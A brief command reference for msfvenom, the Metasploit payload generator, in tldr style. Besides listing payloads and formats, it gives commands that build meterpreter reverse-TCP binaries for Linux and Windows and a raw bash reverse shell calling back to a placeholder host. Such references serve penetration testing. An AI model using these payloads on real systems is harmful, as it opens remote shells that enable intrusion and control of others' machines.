# msfvenom

Manually generate payloads for metasploit.

## Usage
- `msfvenom -l payloads` : list payloads
- `msfvenom -l formats` : list formats
- `msfvenom -p payload --list-options` : show payload options
- `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=local_ip LPORT=local_port -f elf -o path/to/binary` : create an ELF binary with a reverse TCP handler
- `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=local_ip LPORT=local_port -f exe -o path/to/binary.exe` : create an EXE binary with a reverse TCP handler
- `msfvenom -p cmd/unix/reverse_bash LHOST=local_ip LPORT=local_port -f raw` : create a raw Bash with a reverse TCP handler

## Links
- tldr page: https://tldr.inbrowser.app/pages/common/msfvenom
